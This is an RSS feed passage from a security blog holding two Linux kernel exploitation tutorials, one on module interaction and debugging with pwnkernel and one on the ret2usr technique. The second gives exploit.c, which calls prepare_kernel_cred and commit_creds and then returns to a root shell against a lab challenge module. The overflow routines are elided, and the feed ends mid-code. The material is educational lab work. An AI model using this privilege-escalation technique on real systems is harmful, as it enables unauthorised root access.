<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>kernel on Anvbis</title><link>https://anvbis.github.io/tags/kernel/</link><description>Recent content in kernel on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/kernel/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel :: 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Putting it All Together User-space vs. Kernel-space &amp;hellip;
Return to User-space Overview &amp;hellip;
Saving the Initial State &amp;hellip;
unsigned long save_ss, save_sp, save_rf, save_cs; void save_user_space() { /* save user-space */ __asm__( &amp;#34;.intel_syntax noprefix;&amp;#34; &amp;#34;mov save_ss, ss;&amp;#34; &amp;#34;mov save_sp, rsp;&amp;#34; &amp;#34;pushf;&amp;#34; &amp;#34;pop save_rf;&amp;#34; &amp;#34;mov save_cs, cs;&amp;#34; &amp;#34;.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/a>&lt;/li>
&lt;li>&lt;a href="#return-to-user-space-overview">Return to User-space Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#saving-the-initial-state">Saving the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#restoring-the-initial-state">Restoring the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#putting-it-all-together">Putting it All Together&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="return-to-user-space-overview">Return to User-space Overview&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="saving-the-initial-state">Saving the Initial State&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
{
&lt;span style="color:#75715e">/* save user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_ss, ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_sp, rsp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pushf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pop save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_cs, cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="restoring-the-initial-state">Restoring the Initial State&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
{
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;swapgs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_sp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, %[rip];&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;iretq;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">:&lt;/span> [rip] &lt;span style="color:#e6db74">&amp;#34;=&amp;amp;r&amp;#34;&lt;/span> (target)
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff810881c0&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff81087e80&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">commit_creds&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
{
&lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;xor rdi, rdi;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mov rdi, rax;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
{
&lt;span style="color:#75715e">// ...
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
{
&lt;span style="color:#75715e">// ...
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="putting-it-all-together">Putting it All Together&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
{
system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
save_user_space();
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
overflow_buffer(fd, canary);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/exploit.c">exploit.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="6" type="checkbox" checked />
&lt;label for="6">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
unsigned long save_ss, save_sp, save_rf, save_cs;
void shell()
{
system(&amp;#34;/bin/sh&amp;#34;);
}
void save_user_space()
{
/* save user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;mov save_ss, ss;&amp;#34;
&amp;#34;mov save_sp, rsp;&amp;#34;
&amp;#34;pushf;&amp;#34;
&amp;#34;pop save_rf;&amp;#34;
&amp;#34;mov save_cs, cs;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
}
void load_user_space(unsigned long target)
{
/* return to user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;swapgs;&amp;#34;
&amp;#34;mov r15, save_ss;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_sp;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_rf;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_cs;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, %[rip];&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;iretq;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
);
}
void escalate_privileges()
{
/* escalate privileges */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;xor rdi, rdi;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
&amp;#34;call rbx;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
&amp;#34;mov rdi, rax;&amp;#34;
&amp;#34;call rbx;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
/* return to user-space */
load_user_space((unsigned long)shell);
}
unsigned long leak_canary(int fd)
{
// ...
}
void overflow_buffer(int fd, unsigned long canary)
{
// ...
}
int main(int argc, char **argv)
{
save_user_space();
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* leak stack canary */
unsigned long canary = leak_canary(fd);
printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
overflow_buffer(fd, canary);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
/ # uid=0(root) gid=0
&lt;/code>&lt;/pre></content></item><item><title>Linux Kernel :: 0x00 :: Kernel Module Interaction</title><link>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</link><pubDate>Wed, 19 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</guid><description>Table of Contents Environment Setup Debugging in the Kernel Kernel Module Overview Compiling Kernel Modules Inserting Kernel Modules Interacting with File-based Operations Interacting with IOCTL Environment Setup The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:
Downloading and building specific Kernel versions. Streamlining the kernel module build process.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#debugging-in-the-kernel">Debugging in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#kernel-module-overview">Kernel Module Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#compiling-kernel-modules">Compiling Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#inserting-kernel-modules">Inserting Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-file-based-operations">Interacting with File-based Operations&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-ioctl">Interacting with IOCTL&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:&lt;/p>
&lt;ul>
&lt;li>Downloading and building specific Kernel versions.&lt;/li>
&lt;li>Streamlining the kernel module build process.&lt;/li>
&lt;li>Emulate specific kernel versions under the QEMU virtual machine.&lt;/li>
&lt;/ul>
&lt;p>Installation is pretty simple, just clone the repository and run the build script.&lt;/p>
&lt;pre>&lt;code>~/ $ git clone https://github.com/pwncollege/pwnkernel.git
Cloning into 'pwnkernel'...
remote: Enumerating objects: 115, done.
remote: Counting objects: 100% (115/115), done.
remote: Compressing objects: 100% (73/73), done.
remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0
Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done.
Resolving deltas: 100% (59/59), done.
&lt;/code>&lt;/pre>&lt;p>You can optionally specify the kernel version you want to download and compile within the &lt;code>build.sh&lt;/code> script. By default it should be Linux version 5.4.0.&lt;/p>
&lt;pre>&lt;code>~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
&lt;/code>&lt;/pre>&lt;p>Running the virtual machine is equally simple, it&amp;rsquo;s as easy as executing the &lt;code>launch.sh&lt;/code> script. Note that the target kernel version is specified within this script. After executing we can see we&amp;rsquo;re dropped into a shell inside the virtual machine.&lt;/p>
&lt;p>Note: by defauled pwnkernel launches the emulator without any kernel space protections (e.g. kpti, smap, smep, etc).&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="debugging-in-the-kernel">Debugging in the Kernel&lt;/h2>
&lt;p>First launch the kernel virtual machine in a separate terminal window.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;p>Then we need to open &lt;code>pwnkernel/linux-5.4/vmlinux&lt;/code> with GDB and we&amp;rsquo;ll be able to debug the kernel as we see fit. This will allow us to resolve kernel symbols and view kernel memory.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ gdb linux-5.4/vmlinux
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &amp;quot;show copying&amp;quot; and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.
Type &amp;quot;show configuration&amp;quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For help, type &amp;quot;help&amp;quot;.
Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from linux-5.4/vmlinux...
&lt;/code>&lt;/pre>&lt;p>By default the &lt;code>launch.sh&lt;/code> script will run QEMU with a gdbserver instance on port &lt;code>1234&lt;/code>. We can connect to this with the following command.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; target remote :1234
Remote debugging using :1234
default_idle () at arch/x86/kernel/process.c:581
&lt;/code>&lt;/pre>&lt;p>Then, debugging is almost identical to debugging any other binary - we can set breakpoints, step through code, etc. Keep in mind however, when the debugger is paused you will be unable to interact with the Kernel (i.e. enter any commands, etc) until you continue execution.&lt;/p>
&lt;h2 id="kernel-module-overview">Kernel Module Overview&lt;/h2>
&lt;p>Below is a code snippet containing the core parts of a kernel module. These include &lt;code>open&lt;/code>, &lt;code>release&lt;/code>, &lt;code>init_module&lt;/code>, and &lt;code>cleanup_module&lt;/code> functions.&lt;/p>
&lt;p>The &lt;code>init_module&lt;/code> function is called when the module is inserted into the kernel. It will typically create an entry under &amp;lsquo;/proc/&amp;rsquo; or &amp;lsquo;/dev/&amp;rsquo; that the user can interact with.&lt;/p>
&lt;p>The &lt;code>cleanup_module&lt;/code> function is called when the kernel module is removed from the kernel. It will typically remove whatever entry it created within the &lt;code>init_module&lt;/code> function logic.&lt;/p>
&lt;p>The &lt;code>open&lt;/code> function is called when the entry is opened for read/write operations. While the &lt;code>release&lt;/code> function is called when that entry is closed.&lt;/p>
&lt;p>The &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are also important for interacting with the kernel module, but more on these later.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// read from kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// write to kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is opened
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is released
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is inserted into the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is removed from the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>One way to create a kernel module entry is to utilise the &lt;code>register_chrdev&lt;/code> function. This will assign what is called a &amp;lsquo;major number&amp;rsquo; to the kernel module, allowing us to create a kernel module entry under the &amp;lsquo;/dev/&amp;rsquo; directory. The &lt;code>unregister_chrdev&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
major_number &lt;span style="color:#f92672">=&lt;/span> register_chrdev(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">if&lt;/span> (major_number &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> major_number;
printk(KERN_INFO &lt;span style="color:#e6db74">&amp;#34;create device with: &amp;#39;mknod /dev/challenge c %d 0&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, major_number);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
unregister_chrdev(major_number, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can create an entry in the &amp;lsquo;/dev/&amp;rsquo; directory with the command below.&lt;/p>
&lt;pre>&lt;code>/ # mknod /dev/&amp;lt;module name&amp;gt; c &amp;lt;major number&amp;gt; 0
&lt;/code>&lt;/pre>&lt;p>An even simpler way to initialise a kernel module entry is via the &lt;code>proc_create&lt;/code> function. It creates a kernel module entry under the &amp;lsquo;/proc/&amp;rsquo; directory. It does not require any further user input to set up. The &lt;code>proc_remove&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> proc_dir_entry &lt;span style="color:#f92672">*&lt;/span>proc_entry;
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
proc_entry &lt;span style="color:#f92672">=&lt;/span> proc_create(&lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0666&lt;/span>, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">if&lt;/span> (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>While the &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are often great for kernel module interaction, there is another utility that we can use if we need even greater control over our input, this being &lt;code>ioctl&lt;/code>.&lt;/p>
&lt;p>It takes two main arguments an &lt;code>ioctl_num&lt;/code> and an &lt;code>ioctl_param&lt;/code>, where the &lt;code>ioctl_num&lt;/code> can be used (for example) to specify various tasks, and the &lt;code>ioctl_param&lt;/code> can be used to provide something like a pointer to an array or struct.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">challenge_ioctl&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> ioctl_num, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> ioctl_param)
{
&lt;span style="color:#75715e">// when interacted with via ioctl
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
